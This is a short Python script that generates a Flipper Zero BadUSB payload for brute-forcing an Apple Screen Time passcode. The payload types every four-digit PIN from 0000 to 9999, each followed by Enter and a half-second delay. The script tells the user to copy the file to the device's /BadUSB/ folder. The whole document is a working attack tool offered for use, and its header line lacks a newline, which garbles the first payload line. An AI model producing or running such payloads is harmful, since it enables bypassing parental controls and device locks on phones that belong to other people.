# Flipper Zero Screen Time Password Bruteforce Wordlist Generator

total_sequences = 10000    
delay_ms = 500             
initial_delay_ms = 5000   
filename = "dummy_pin_all.txt"  

with open(filename, "w") as f:
    f.write("Flipper Zero Screen Time Password Bruteforce Wordlist Generator")
    f.write(f"DELAY {initial_delay_ms}\n\n") 

    for i in range(total_sequences):
        pin = f"{i:04d}"
        f.write(f"STRING {pin}\n")
        f.write("ENTER\n")
        f.write(f"DELAY {delay_ms}\n\n")

print(f"Generated {filename} with {total_sequences} sequences.")
print("Copy it to /BadUSB/ on your Flipper Zero.")
